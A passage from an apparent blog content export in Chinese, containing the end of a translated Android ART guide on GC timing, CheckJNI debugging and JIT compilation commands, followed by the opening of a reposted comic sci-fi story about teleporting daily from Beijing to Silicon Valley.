类型的阶段和暂停时间的直方图信息。暂停信息通常比较重要。例如：\n\n```\nyoung concurrent copying paused:\tSum: 5.491ms 99% C.I. 1.464ms-2.133ms Avg: 1.830ms Max: 2.133ms\n```\n\n本示例中显示平均暂停时间为 1.83 毫秒，该值应该足够低，在大多数应用中不会导致丢帧，因此您不必担心。\n\n需要关注的另一个方面是挂起时间，挂起时间测量在 GC 要求某个线程挂起后，该线程到达挂起点所需的时间。此时间包含在 GC 暂停时间中，所以对于确定长时间暂停是由 GC 缓慢还是线程挂起缓慢造成的很有用。以下是 Nexus 5 上的正常挂起时间示例：\n\n```\nsuspend all histogram:\tSum: 1.513ms 99% C.I. 3us-546.560us Avg: 47.281us Max: 601us\n```\n\n还有其他一些需要关注的方面，包括总耗时和 GC 吞吐量。示例：\n\n```\nTotal time spent in GC: 502.251ms\nMean GC size throughput: 92MB/s\nMean GC object throughput: 1.54702e+06 objects/s\n```\n\n以下示例说明了如何转储已在运行的应用的 GC 时序：\n\n```\nadb shell kill -s QUIT PID\nadb pull /data/anr/anr_2020-07-13-19-23-39-817\n```\n\n此时，GC 时序在 `anr_2020-07-13-19-23-39-817` 中。以下是 Google 地图的输出示例：\n\n```\nStart Dumping histograms for 2195 iterations for concurrent copying\nMarkingPhase:   Sum: 258.127s 99% C.I. 58.854ms-352.575ms Avg: 117.651ms Max: 641.940ms\nScanCardsForSpace:      Sum: 85.966s 99% C.I. 15.121ms-112.080ms Avg: 39.164ms Max: 662.555ms\nScanImmuneSpaces:       Sum: 79.066s 99% C.I. 7.614ms-57.658ms Avg: 18.014ms Max: 546.276ms\nProcessMarkStack:       Sum: 49.308s 99% C.I. 6.439ms-81.640ms Avg: 22.464ms Max: 638.448ms\nClearFromSpace: Sum: 35.068s 99% C.I. 6.522ms-40.040ms Avg: 15.976ms Max: 633.665ms\nSweepSystemWeaks:       Sum: 14.209s 99% C.I. 3.224ms-15.210ms Avg: 6.473ms Max: 201.738ms\nCaptureThreadRootsForMarking:   Sum: 11.067s 99% C.I. 0.835ms-13.902ms Avg: 5.044ms Max: 25.565ms\nVisitConcurrentRoots:   Sum: 8.588s 99% C.I. 1.260ms-8.547ms Avg: 1.956ms Max: 231.593ms\nProcessReferences:      Sum: 7.868s 99% C.I. 0.002ms-8.336ms Avg: 1.792ms Max: 17.376ms\nEnqueueFinalizerReferences:     Sum: 3.976s 99% C.I. 0.691ms-8.005ms Avg: 1.811ms Max: 16.540ms\nGrayAllDirtyImmuneObjects:      Sum: 3.721s 99% C.I. 0.622ms-6.702ms Avg: 1.695ms Max: 14.893ms\nSweepLargeObjects:      Sum: 3.202s 99% C.I. 0.032ms-6.388ms Avg: 1.458ms Max: 549.851ms\nFlipOtherThreads:       Sum: 2.265s 99% C.I. 0.487ms-3.702ms Avg: 1.031ms Max: 6.327ms\nVisitNonThreadRoots:    Sum: 1.883s 99% C.I. 45us-3207.333us Avg: 429.210us Max: 27524us\nInitializePhase:        Sum: 1.624s 99% C.I. 231.171us-2751.250us Avg: 740.220us Max: 6961us\nForwardSoftReferences:  Sum: 1.071s 99% C.I. 215.113us-2175.625us Avg: 488.362us Max: 7441us\nReclaimPhase:   Sum: 490.854ms 99% C.I. 32.029us-6373.807us Avg: 223.623us Max: 362851us\nEmptyRBMarkBitStack:    Sum: 479.736ms 99% C.I. 11us-3202.500us Avg: 218.558us Max: 13652us\nCopyingPhase:   Sum: 399.163ms 99% C.I. 24us-4602.500us Avg: 181.851us Max: 22865us\nThreadListFlip: Sum: 295.609ms 99% C.I. 15us-2134.999us Avg: 134.673us Max: 13578us\nResumeRunnableThreads:  Sum: 238.329ms 99% C.I. 5us-2351.250us Avg: 108.578us Max: 10539us\nResumeOtherThreads:     Sum: 207.915ms 99% C.I. 1.072us-3602.499us Avg: 94.722us Max: 14179us\nRecordFree:     Sum: 188.009ms 99% C.I. 64us-312.812us Avg: 85.653us Max: 2709us\nMarkZygoteLargeObjects: Sum: 133.301ms 99% C.I. 12us-734.999us Avg: 60.729us Max: 10169us\nMarkStackAsLive:        Sum: 127.554ms 99% C.I. 13us-417.083us Avg: 58.111us Max: 1728us\nFlipThreadRoots:        Sum: 126.119ms 99% C.I. 1.028us-3202.499us Avg: 57.457us Max: 11412us\nSweepAllocSpace:        Sum: 117.761ms 99% C.I. 24us-400.624us Avg: 53.649us Max: 1541us\nSwapBitmaps:    Sum: 56.301ms 99% C.I. 10us-125.312us Avg: 25.649us Max: 1475us\n(Paused)GrayAllNewlyDirtyImmuneObjects: Sum: 33.047ms 99% C.I. 9us-49.931us Avg: 15.055us Max: 72us\n(Paused)SetFromSpace:   Sum: 11.651ms 99% C.I. 2us-49.772us Avg: 5.307us Max: 71us\n(Paused)FlipCallback:   Sum: 7.693ms 99% C.I. 2us-32us Avg: 3.504us Max: 32us\n(Paused)ClearCards:     Sum: 6.371ms 99% C.I. 250ns-49753ns Avg: 207ns Max: 188000ns\nSweep:  Sum: 5.793ms 99% C.I. 1us-49.818us Avg: 2.639us Max: 93us\nUnBindBitmaps:  Sum: 5.255ms 99% C.I. 1us-31us Avg: 2.394us Max: 31us\nDone Dumping histograms\nconcurrent copying paused:      Sum: 315.249ms 99% C.I. 49us-1378.125us Avg: 143.621us Max: 7722us\nconcurrent copying freed-bytes: Avg: 34MB Max: 54MB Min: 2062KB\nFreed-bytes histogram: 0:4,5120:5,10240:19,15360:69,20480:167,25600:364,30720:529,35840:405,40960:284,46080:311,51200:38\nconcurrent copying total time: 569.947s mean time: 259.657ms\nconcurrent copying freed: 1453160493 objects with total size 74GB\nconcurrent copying throughput: 2.54964e+06/s / 134MB/s  per cpu-time: 157655668/s / 150MB/s\nAverage major GC reclaim bytes ratio 0.486928 over 2195 GC cycles\nAverage major GC copied live bytes ratio 0.0894662 over 2199 major GCs\nCumulative bytes moved 6586367960\nCumulative objects moved 127490240\nPeak regions allocated 376 (94MB) / 2048 (512MB)\nStart Dumping histograms for 685 iterations for young concurrent copying\nScanCardsForSpace:      Sum: 26.288s 99% C.I. 8.617ms-77.759ms Avg: 38.377ms Max: 432.991ms\nProcessMarkStack:       Sum: 21.829s 99% C.I. 2.116ms-71.119ms Avg: 31.868ms Max: 98.679ms\nClearFromSpace: Sum: 19.420s 99% C.I. 5.480ms-50.293ms Avg: 28.351ms Max: 507.330ms\nScanImmuneSpaces:       Sum: 9.968s 99% C.I. 8.155ms-30.639ms Avg: 14.552ms Max: 46.676ms\nSweepSystemWeaks:       Sum: 6.741s 99% C.I. 3.655ms-14.715ms Avg: 9.841ms Max: 22.142ms\nGrayAllDirtyImmuneObjects:      Sum: 4.466s 99% C.I. 0.584ms-14.315ms Avg: 6.519ms Max: 24.355ms\nFlipOtherThreads:       Sum: 3.672s 99% C.I. 0.631ms-16.630ms Avg: 5.361ms Max: 18.513ms\nProcessReferences:      Sum: 2.806s 99% C.I. 0.001ms-9.459ms Avg: 2.048ms Max: 11.951ms\nEnqueueFinalizerReferences:     Sum: 1.857s 99% C.I. 0.424ms-8.609ms Avg: 2.711ms Max: 24.063ms\nVisitConcurrentRoots:   Sum: 1.094s 99% C.I. 1.306ms-5.357ms Avg: 1.598ms Max: 6.831ms\nSweepArray:     Sum: 711.032ms 99% C.I. 0.022ms-3.502ms Avg: 1.038ms Max: 7.307ms\nInitializePhase:        Sum: 667.346ms 99% C.I. 303us-2643.749us Avg: 974.227us Max: 3199us\nVisitNonThreadRoots:    Sum: 388.145ms 99% C.I. 103.911us-1385.833us Avg: 566.635us Max: 5374us\nThreadListFlip: Sum: 202.730ms 99% C.I. 18us-2414.999us Avg: 295.956us Max: 6780us\nEmptyRBMarkBitStack:    Sum: 132.934ms 99% C.I. 8us-1757.499us Avg: 194.064us Max: 8495us\nResumeRunnableThreads:  Sum: 109.593ms 99% C.I. 6us-4719.999us Avg: 159.989us Max: 11106us\nResumeOtherThreads:     Sum: 86.733ms 99% C.I. 3us-4114.999us Avg: 126.617us Max: 19332us\nForwardSoftReferences:  Sum: 69.686ms 99% C.I. 14us-2014.999us Avg: 101.731us Max: 4723us\nRecordFree:     Sum: 58.889ms 99% C.I. 0.500us-185.833us Avg: 42.984us Max: 769us\nFlipThreadRoots:        Sum: 58.540ms 99% C.I. 1.034us-4314.999us Avg: 85.459us Max: 10224us\nCopyingPhase:   Sum: 52.227ms 99% C.I. 26us-728.749us Avg: 76.243us Max: 2060us\nReclaimPhase:   Sum: 37.207ms 99% C.I. 7us-2322.499us Avg: 54.316us Max: 3826us\n(Paused)GrayAllNewlyDirtyImmuneObjects: Sum: 23.859ms 99% C.I. 11us-98.917us Avg: 34.830us Max: 128us\nFreeList:       Sum: 20.376ms 99% C.I. 2us-188.875us Avg: 29.573us Max: 998us\nMarkZygoteLargeObjects: Sum: 18.970ms 99% C.I. 4us-115.749us Avg: 27.693us Max: 122us\n(Paused)SetFromSpace:   Sum: 12.331ms 99% C.I. 3us-94.226us Avg: 18.001us Max: 109us\nSwapBitmaps:    Sum: 11.761ms 99% C.I. 5us-49.968us Avg: 17.169us Max: 67us\nResetStack:     Sum: 4.317ms 99% C.I. 1us-64.374us Avg: 6.302us Max: 190us\nUnBindBitmaps:  Sum: 3.803ms 99% C.I. 4us-49.822us Avg: 5.551us Max: 70us\n(Paused)ClearCards:     Sum: 3.336ms 99% C.I. 250ns-7000ns Avg: 347ns Max: 7000ns\n(Paused)FlipCallback:   Sum: 3.082ms 99% C.I. 1us-30us Avg: 4.499us Max: 30us\nDone Dumping histograms\nyoung concurrent copying paused:        Sum: 229.314ms 99% C.I. 37us-2287.499us Avg: 334.764us Max: 6850us\nyoung concurrent copying freed-bytes: Avg: 44MB Max: 50MB Min: 9132KB\nFreed-bytes histogram: 5120:1,15360:1,20480:6,25600:1,30720:1,35840:9,40960:235,46080:427,51200:4\nyoung concurrent copying total time: 100.823s mean time: 147.187ms\nyoung concurrent copying freed: 519927309 objects with total size 30GB\nyoung concurrent copying throughput: 5.15683e+06/s / 304MB/s  per cpu-time: 333152554/s / 317MB/s\nAverage minor GC reclaim bytes ratio 0.52381 over 685 GC cycles\nAverage minor GC copied live bytes ratio 0.0512109 over 685 minor GCs\nCumulative bytes moved 1542000944\nCumulative objects moved 28393168\nPeak regions allocated 376 (94MB) / 2048 (512MB)\nTotal time spent in GC: 670.771s\nMean GC size throughput: 159MB/s per cpu-time: 177MB/s\nMean GC object throughput: 2.94152e+06 objects/s\nTotal number of allocations 1974199562\nTotal bytes allocated 104GB\nTotal bytes freed 104GB\nFree memory 10MB\nFree memory until GC 10MB\nFree memory until OOME 442MB\nTotal memory 80MB\nMax memory 512MB\nZygote space size 2780KB\nTotal mutator paused time: 544.563ms\nTotal time waiting for GC to complete: 117.494ms\nTotal GC count: 2880\nTotal GC time: 670.771s\nTotal blocking GC count: 1\nTotal blocking GC time: 86.373ms\nHistogram of GC count per 10000 ms: 0:259879,1:2828,2:24,3:1\nHistogram of blocking GC count per 10000 ms: 0:262731,1:1\nNative bytes total: 30599192 registered: 8947416\nTotal native bytes at last GC: 30344912\n```\n\n### 分析 GC 正确性问题的工具\n\n造成 ART 内部崩溃的原因多种多样。读取或写入对象字段时发生崩溃可能表明堆损坏。如果 GC 在运行时崩溃，也可能是由堆损坏造成的。造成堆损坏的最常见原因是应用代码不正确。好在有一些工具可用来调试与 GC 和堆相关的崩溃问题，这些工具包括上面指定的堆验证选项和 CheckJNI。\n\n#### CheckJNI\n\nCheckJNI 是一种添加 JNI 检查来验证应用行为的模式；出于性能方面的原因，默认情况下不启用此类检查。此类检查将捕获一些可能会导致堆损坏的错误，如使用无效/过时的局部和全局引用。如需启用 CheckJNI，请使用以下命令：\n\n```\nadb shell setprop dalvik.vm.checkjni true\n```\n\nCheckJNI 的 forcecopy 模式对于检测超出数组区域末端的写入很有用。启用后，forcecopy 会促使数组访问 JNI 函数返回带有红色区域的副本。红色区域是返回的指针末端/始端的一个区域，该区域具有一个特殊值，该值在数组释放时得到验证。如果红色区域中的值与预期值不匹配，表明发生了缓冲区溢出或欠载。这会导致 CheckJNI 中止。如需启用 forcecopy 模式，请使用以下命令：\n\n```\nadb shell setprop dalvik.vm.jniopts forcecopy\n```\n\n举例来说，当写入超出从 `GetPrimitiveArrayCritical` 获取的数组的末端时，这就是 CheckJNI 应捕获的一个错误。此操作可能会损坏 Java 堆。如果写入发生在 CheckJNI 红色区域内，则在调用相应的 `ReleasePrimitiveArrayCritical` 时，CheckJNI 会捕获该问题。否则，写入会损坏 Java 堆中的某个随机对象，并且可能会导致将来发生 GC 崩溃。如果损坏的内存是引用字段，则 GC 可能会捕获错误并输出错误消息“Tried to mark <ptr> not contained by any spaces”。\n\n当 GC 尝试标记一个对象但无法找到其空间时，就会发生此错误。此检查失败后，GC 会遍历根，并尝试查看无效的对象是否为根。结果共有两个选项：对象为根或非根。\n\n#### 无效根示例\n\n如果对象为无效根，则会输出一些有用的信息：`art E 5955 5955 art/runtime/gc/collector/mark_sweep.cc:383] Tried to mark 0x2 not contained by any spaces`\n\n```\nart E  5955  5955 art/runtime/gc/collector/mark_sweep.cc:384] Attempting see if\nit's a bad root\nart E  5955  5955 art/runtime/gc/collector/mark_sweep.cc:485] Found invalid\nroot: 0x2\nart E  5955  5955 art/runtime/gc/collector/mark_sweep.cc:486]\nType=RootJavaFrame thread_id=1 location=Visiting method 'java.lang.Object\ncom.google.gwt.corp.collections.JavaReadableJsArray.get(int)' at dex PC 0x0002\n(native PC 0xf19609d9) vreg=1\n```\n\n在本示例中，`com.google.gwt.corp.collections.JavaReadableJsArray.get` 内的 `vreg=1` 应该包含一个堆引用，但却包含了一个地址为 `0x2` 的无效指针。这是一个无效根。如需调试此问题，请在 oat 文件上使用 `oatdump`，并查看具有无效根的方法。在本示例中，结果证明错误在于 x86 后端的编译器错误。修复该错误的变更列表如下：https://android-review.googlesource.com/#/c/133932/\n\n#### 损坏的对象示例\n\n如果对象不是根，则输出类似于以下内容：\n\n```\n01-15 12:38:00.196  1217  1238 E art     : Attempting see if it's a bad root\n01-15 12:38:00.196  1217  1238 F art     :\nart/runtime/gc/collector/mark_sweep.cc:381] Can't mark invalid object\n```\n\n如果堆损坏不是无效根，将很难调试。此错误消息表明堆中至少有一个对象指向无效对象。\n\n\n\n## 实现 ART 即时 (JIT) 编译器\n\nAndroid Runtime (ART) 包含一个具备代码分析功能的即时 (JIT) 编译器，该编译器可以在 Android 应用运行时持续提高其性能。JIT 编译器对 Android 运行组件当前的预先 (AOT) 编译器进行了补充，可以提升运行时性能，节省存储空间，加快应用和系统更新速度。相较于 AOT 编译器，JIT 编译器的优势也更为明显，因为在应用自动更新期间或在无线下载 (OTA) 更新期间重新编译应用时，它不会拖慢系统速度。\n\n尽管 JIT 和 AOT 使用相同的编译器，它们所进行的一系列优化也较为相似，但它们生成的代码可能会有所不同。JIT 会利用运行时类型信息，可以更高效地进行内联，并可让堆栈替换 (OSR) 编译成为可能，而这一切都会使其生成的代码略有不同。\n\n### JIT 架构\n\n![JIT 架构](https://up-img.yonghong.tech/pic/2021/07/29-20-44-jit-arch-3Fcld1.png)\n\n**图 1.** JIT 架构。\n\n### JIT 编译\n\nJIT 编译涉及以下活动：\n\n![配置文件指导的编译](https://up-img.yonghong.tech/pic/2021/07/29-20-44-jit-profile-comp-RifrTY.png)\n\n**图 2.** 配置文件引导的编译。\n\n1. 用户运行应用，此举随后触发 ART 加载`.dex`文件。\n\n    - 如果有 `.oat` 文件（即 `.dex` 文件的 AOT 二进制文件），ART 会直接使用该文件。虽然 `.oat` 文件会定期生成，但文件中不一定会包含经过编译的代码（即 AOT 二进制文件）。\n    - 如果 `.oat` 文件不含经过编译的代码，ART 会通过 JIT 和解释器执行 `.dex` 文件。\n\n2. 针对任何未根据 `speed` 编译过滤器编译的应用启用 JIT（也就是说，要尽可能多地编译应用中的代码）。\n\n3. 将 JIT 配置文件数据转储到只有该应用可以访问的系统目录下的文件中。\n\n4. AOT 编译 (`dex2oat`) 守护程序通过解析该文件来推进其编译。\n\n    ![JIT 守护程序](https://up-img.yonghong.tech/pic/2021/07/29-20-44-jit-daemon-NoNjuF.png)**图 3.** JIT 守护程序活动。\n\n举例来说，Google Play 服务就是一种由其他应用使用的类似于共享库的服务。\n\n### JIT 工作流程\n\n![JIT 架构](https://source.android.com/devices/tech/dalvik/images/jit-workflow.png?hl=zh-cn)\n\n**图 4.** JIT 数据流。\n\n- 分析信息会存储在代码缓存中，并会在内存紧张时作为垃圾被回收。\n\n    - 无法保证在应用处于后台运行状态时所捕获的快照能够包含完整的数据（即 JIT 编译的所有内容）。\n    - 该过程不会尝试确保记录所有内容（因为这会影响运行时性能）。\n\n- 方法可能有三种不同的状态：\n\n    - 已经过解释（dex 代码）\n    - 已经过 JIT 编译\n    - 已经过 AOT 编译\n\n    如果同时存在 JIT 和 AOT 代码（例如，由于反复进行逆优化），经过 JIT 编译的代码将是首选代码。\n\n- 在不影响前台应用性能的情况下运行 JIT 所需的内存取决于相关应用。大型应用比小型应用需要更多内存。一般来说，大型应用所需的内存稳定维持在 4 MB 左右。\n\n### 开启 JIT 日志记录\n\n要开启 JIT 日志记录，请运行以下命令：\n\n```\nadb root\nadb shell stop\nadb shell setprop dalvik.vm.extra-opts -verbose:jit\nadb shell start\n```\n\n### 停用 JIT\n\n要停用 JIT，请运行以下命令：\n\n```\nadb root\nadb shell stop\nadb shell setprop dalvik.vm.usejit false\nadb shell start\n```\n\n### 强制编译\n\n要强制编译，请运行以下命令：\n\n```\nadb shell cmd package compile\n```\n\n强制编译特定软件包的常见用例：\n\n- 基于配置文件：\n\n    ```\n    adb shell cmd package compile -m speed-profile -f my-package\n    ```\n\n- 全面：\n\n    ```\n    adb shell cmd package compile -m speed -f my-package\n    ```\n\n强制编译所有软件包的常见用例：\n\n- 基于配置文件：\n\n    ```\n    adb shell cmd package compile -m speed-profile -f -a\n    ```\n\n- 全面：\n\n    ```\n    adb shell cmd package compile -m speed -f -a\n    ```\n\n### 清除配置文件数据\n\n要清除配置文件数据并移除经过编译的代码，请运行以下命令：\n\n- 针对一个软件包：\n\n    ```\n    adb shell cmd package compile --reset my-package\n    ```\n\n- 针对所有软件包：\n\n    ```\n    adb shell cmd package compile --reset -a\n    ```","categories":["Android"],"tags":["JVM","Android","ART","Dalvik","运行时","虚拟机"]},{"title":"我如何每日从北京酒仙桥到加州硅谷上班","url":"/repost/2020/wo-mei-ri-ru-he-cong-bei-jing-jiu-xian-qiao-dao-jia-zhou-gui-gu-shang-ban/","content":"\n我不知道该如何向你们说这件事儿——轻描淡写地说吧，估计你们所有人都会扑哧一笑，觉得我一定是嗑药嗑太多脑子坏掉了，多半还患上了轻度妄想症；但要说得言之凿凿，又怕你们执意要我证明给你们看，那我可是一点辙儿都没有，别到时再好死不死落个妖言惑众的名声，自讨没趣。\n\n于是前思后想之后，我决定用这个既带有地摊玄幻小说风格，又秉承长微博技术贴标准的模棱两可的标题缓冲一下，总之进可攻退可守。你若相信，我便晴天，你若不信，那我也好顺水推舟地承认这是篇不成功的科幻小说习作，至少我的结局不至于像凯文·斯帕西在《K星异客》中饰演的那个从距地球一千光年以外的天琴座K-PAX星球以超光速来地球游览的普洛特那样，被你们不分青红皂白地当做精神病人扭送到曼哈顿或回龙观精神病院吧。\n\n因此，你们大可以把前面这两段话当做我从法律上推卸自我责任的声明。是的，我不想多惹事，不过，请允许我在认真给你们讲述这件听起来离奇透顶的事情之前再最后多唠叨一句——不管你相信也好，怀疑也罢，请记住那个五百年前生活在雅芳河畔斯特拉特福叫做威廉·莎士比亚的英国人说的一句话——“凡是过去，皆为序曲”。\n\n好了，开始讲我的故事。\n\n<!--more-->\n\n这事儿说起来也挺简单：我住的地儿在北京东北边儿，你若走四环路的话，从东风北桥下来之后拐到酒仙桥路，看到一个和新修的颐堤港遥相对望的叫做晶都国际的小区，那就是了。我每天工作八小时，准时上下班，基本风雨无阻，经常会和老婆去三元桥边儿上的“鹿港小镇”吃晚餐，没什么特殊的。当然，唯一可能和诸位有点儿不同的就是，我上班的地点在硅谷一个叫做红杉海岸的小城，对，就是甲骨文公司总部的所在地，而且，那个，我，每天，都回家。\n\n对，你没看错，我每天要从酒仙桥去硅谷上班。我知道这听起来太狗血，说实话，直到今天，我都有一种不真实的感觉，生怕这是我臆想出来的一个梦境。为此我做了许多实验，结论就是，如果不是整个世界都在陪我演一出疯狂闹剧的话，那么按照夏洛克·福尔摩斯先生那个著名的“当你把一切不可能的结论都排除之后，那剩下的，不管多么离奇，也必然是事实”的假设推导下，唯一的可能性就是，这一切都是真的！\n\nOk，我明白我说得有一点语无伦次，好吧，请让我深呼吸一下，从头慢慢道来0\n\n2009年，我从北京来到加州求学，和所有漂泊在异乡的学子一样，交替体验着新鲜感与思乡病。\n\n2010年春天，我搬到了离斯坦福不远的一个叫做贝蒙特的小镇，因为我在这附近找到了一份工作，而所有的一切，都是从那时开始的。\n\n在公司里，我认识了一位很厉害很厉害的前辈，（什么，我只说了两个“很厉害”？那一定要再补一个才对，是很厉害很厉害很厉害的前辈！）这位前辈十六岁从哥伦比亚大学毕业，二十岁时拿到了斯坦福大学电子电气和生物技术的双料博士，是卡内基梅隆的客座教授，还是美国海军现役军官，曾经是英特尔年轻的副总裁级，现在则是一个几百亿美元对冲基金的合伙人（同时也是我们公司的董事会成员之一），他还是一个智商在170以上的意大利裔天才，最不可思议的是，在拥有了上述这一切的同时，他才三十四岁。\n\n请别怪我啰唆，因为长这么大能让我有这种高山仰止感觉的人毕竟不多，更何况，倘若不是因为这位前辈，我永远也不可能窥到这个号称21世纪被发达国家隐藏得最好的科学机密。\n\n虽然早就知道以美国为首的西方国家对我们进行技术封锁，但我始终以为，这些封锁造成的结果顶多让我们的技术落后西方国家一两代罢了，就像我们有歼-10、人家有F-22一样，我根本没有想到原来这种差距居然是……怎么说呢，用那位前辈的原话就是“蒸汽时代和电气时代的类比已经不足以说明问题了，应该是，麻瓜世界和魔法世界的差别吧”。\n\n我想读到这里的诸位一定会龇龇牙，从牙缝中发出一声不屑的冷笑。没关系，请尽管笑，我特理解，因为当那位前辈第一次向我如此描述他所认为的发展中国家和发达国家之间的科技差距时，我也从牙缝中发出了同样的冷笑啊。但不幸的是，在听完他的阐述，并且亲自经历过那一切后，我的牙缝中就只剩下冷了，笑容则全都凝固了。\n\n这件离奇的事情发生在一个平常的午后，我在公司的咖啡厅里偶遇了这位前辈，他大概是恰好来公司开股东会议，而最近公司的绩效不错，所以他看起来心情颇佳。闲聊之际，话题自然而然就被硅谷特有的万有引力所吸引，滑向了高科技。\n\n“我上周去上海开会，见了你们中国的几个科学家，说实话，中国的科技水平明显还停留在上个世纪。”这位前辈咂了一口咖啡。\n\n“开什么玩笑，我们的载人飞船和空间站可是刚刚完成对接啊。”我情不自禁地反驳道。\n\n“载人飞船？你还不如说你们还发现了盘尼西林呢！”那位前辈听完我愤愤不平的言语后揶揄地说，“仅在休斯敦，在太空工作站工作过六个月以上的人数就超过了得州所有的牛仔，你以为《太空牛仔》这部电影的剧本是克林特·伊斯特伍德凭空想出来的吗？说实话，1969年之后，航空航天就彻底沦为一门应用学科了，真正的科学家早就把目光投向了别处。这么说吧，发展中国家和发达国家之间的差距，用蒸汽时代和电气时代的类比已经不足以说明问题了，应该是……”他慢条斯理地吹了吹摩卡上漂着的那层奶泡，那170+的智商无疑在高速运转，试图找出一个邪恶的词汇来描述这种差距。\n\n最终，他眨了眨眼，说出了那句我甚至以为自己听错了的话：“麻瓜世界和魔法世界的差别吧。”\n\n我有点儿不可思议地瞅着这位前辈，试图在他的眼中找到那个“哈哈，我在开玩笑啦”的神色，但是他的眼神狡黠归狡黠，却没有一丝开玩笑的意思。不过我也不甘示弱，马上反唇相讥：“我承认中国和美国在不少科学领域的确存在着巨大的鸿沟，但麻瓜世界和魔法世界的差别……拜托，你这也有点儿太言过其实了吧……”\n\n“言过其实？或许吧。”这位前辈笑了笑，“在我的定义里，蒸汽时代和电气时代的差距，是当一个蒸汽机师第一次看到电动机的时候，他一定会十分惊讶地发现这个机器和他所了解的热力学机器十分不同，但是他不会诧异到认为是幽灵驱动了这一切，而是会合理地假定这个机器是按照某种他所不了解的原理所运行的。”他在此处停顿了一下，用眼神询问我是否认同，我缓缓地点了点头，于是他接着说，“而麻瓜世界和魔法世界的差别是当一个麻瓜第一次看到一个魔法师把飞路粉（floo powder）洒在身上然后钻进壁炉里消失得无影无踪的时候。你看过《哈利·波特》吧？嗯，你明白就好，他的唯一反应一定是holy shit！黑魔法！”说到此处，他夸张地做了一个受到惊吓的表情，然后把自己也逗乐了。\n\n我听罢反而长舒了一口气，唇角挂上了一丝冷笑，原来前辈只是追求语不惊人死不休的效果罢了，所以我有点儿挑衅地说：“既然这样，那么，魔法师，请向我这个麻瓜展示一下你们的魔法世界吧，让我也有机会holy shit一下，多好啊。”\n\n想不到他马上站起来说：“好啊，那我们就干脆从飞路粉开始吧。”我有点儿不知所措地瞪着他，怀疑他最近是不是报名参加了什么即兴表演班——最近硅谷流行这个——然后拿我当观众做练习了。不过他没有给我多少迷茫的时间，掏出车钥匙冲我挥了挥手，“走啊，坐着干吗，想见识飞路粉的话，我们得找一个最近的宜家才行！”\n\n飞路粉？宜家？他不是疯了吧？但是看他气定神闲信心笃定的样子，又一点不像是恶作剧。不管怎样，我还是跟着他上了车，直奔加州101高速，往圣何塞方向驶去——难道真的要去宜家？我知道在帕罗奥图边上的确有一家宜家家居。\n\n“嗯，那个，我知道听起来很傻，不过我们到底要去哪里？真的是宜家？”坐在车上我还是忍不住发问了。\n\n“你不是要见识一下我们的黑魔法吗？宜家的飞路粉电梯应该算是黑魔法101课程吧。”他兴致盎然地说。\n\n“……”我彻底无语了，如果这是个玩笑的话，我真的已经找不到笑点在什么地方了。\n\n“Okay，不开玩笑了，我真的带你去看一下现实存在的飞路粉。别笑，我知道这个词听起来太孩子气。”他耸了耸肩，“不过你也不能怪我，因为J·K·罗琳的小说太流行了，所以当这个产品2004年刚研发出来的时候，所有的人都立刻把它叫做飞路粉了。”\n\n“噢，一个叫做飞路粉的产品？我怎么从来没有听说过？”我有点儿好奇了。\n\n“你没听说过太正常了，就连美国人也不是每个人都知道它的存在——哈，幸好你认识我，今天你要大开眼界了。”他扭头冲我笑了笑，“当然，这种信息封锁也是无奈之举，你知道我们在二战后对科技领域进行了巨大的投资，初期当然是为了和苏联搞军备竞赛，但后来则意外地在基础物理学领域取得了巨大突破。你知道科学发展是有加速度的，想象一下从罗盘六分仪发展到全球定位系统用了多长时间，再想象一下从阿波罗11号4KB内存的导航控制计算机发展到尧字节用了多长时间你就明白了。井喷式的科技发展最初给美国带来的是惊喜，我们也曾兴致勃勃地试图将这些新的学术成果和技术推广给西方盟友之外的发展中国家，但是，‘9·11事件’的发生让美国政府开始重新审视国家安全问题，他们开始担忧，倘若这些比核能强大几万倍的新技术落到一些道德准则和制度规范都不健全的国家政权手里的话，后果不堪设想。在意识到这一点之后，以美国为首的西方国家开始有计划地封锁一些高端的科学研究成果和技术，别说对中国，有些新的研究成果即便是对美国最亲密的盟友，倘若该国没有一定级别，都绝对接触不到。当然，我今天带你看的这个东西离最先进的研究成果还差很远很远，但相信我，这已经足以颠覆你的大脑了。”他一边开车，一边做出一个大脑爆炸的手势。\n\n说实话，听他说上述这段话的时候，我还是觉得他在开一个有关历史阴谋论的玩笑，毕竟，倘若基础物理学真有像他所说的如此巨大的突破，没有理由其他国家的科学家连一点蛛丝马迹都没听到，难道那些国际学术杂志和诺贝尔奖都是演戏吗？\n\n“演戏？哈哈，你说得太对了！”他哈哈大笑，“杰克，和你说一件我不该说的事情——记住，下面这句话我从来没有说过，你倘若无端地知道了，那也绝对不是从我这里听到的，明白？”他看了看了我，我忙不迭地点头，听八卦的心态我还是很足的。\n\n“为了封锁最新的研究成果，整个西方世界就是在给发展中国家演戏。你知道，就像当年斯大林的《真理报》一样，至于瑞典皇家科学院都根本就是在作秀，诺贝尔奖就是一个prop。prop你懂吗？就是演戏的道具，骗你们的玩意儿而已！别说诺贝尔奖了，你以为宜家真的是卖家具的商场吗？别天真了，瑞典可不是出木匠的国家！”\n\n我彻底晕了，如果这一切只是为了一个恶作剧的话，那我只能说它太无厘头了，不过看着他信誓旦旦的样子，我还是决定冒险问出这个可能会被他嘲笑一辈子的问题：“那么……你刚才说的飞路粉到底是什么东西？如果说这背后的技术涉及你们美国的国家安全的话，那你让我见识这种‘黑魔法’，不会把我‘阅后即焚’吧？”\n\n“‘阅后即焚’？哈哈，杰克，你太逗了，你的英语造诣很高啊！放心，既然我敢让你看，就不担心保密的问题，反正就算你跟你的同胞说了，他们也不会相信你的，哈哈，这是最妙的部分啊！不过你也够幸运啦，没有几个中国人见识过这个产品的！多说无用，你自己体验一下就明白了。”他打转向灯，从大学路出口驶出101高速。\n\n车没有在宜家的停车场里停下，而是径直开到了停车场底层的一个地下通道，不知道检测了一下什么东西，封闭的大门缓缓打开，黑色的特斯拉电动汽车慢慢驶入。车子停稳，我跟着前辈走向一扇玻璃门，门口站着两个穿着警服但是没拿甜甜圈所以我也不确定究竟是不是警察的人。他们看了我一眼，然后冲前辈点了点头，什么也没说就把视线移到了别处。前辈示意我跟上，进门前一扬手佯作扔给了我一个什么东西，我下意识地伸手接了一下，然后才反应过来什么都没有，我有点儿莫名其妙地看了他一眼，他模仿着《黑客帝国》里面墨菲斯的口吻说了一句：“吞下这个红色的药丸……”\n\n如果是恶作剧的话，戏还做得真足。\n\n和《黑衣人》中的剧情一样，进了玻璃门，走廊里坐着一个根本不屑看你一眼的黑人老头。我跟着前辈径直走进直冲着大门的电梯，摁下里面唯一的一个按钮后，电梯迅速下降。\n\n等电梯门再次打开的时候，我霎时明白这绝对不是一个恶作剧了，因为，没有人会花这么大的成本来戏弄我。\n\n我无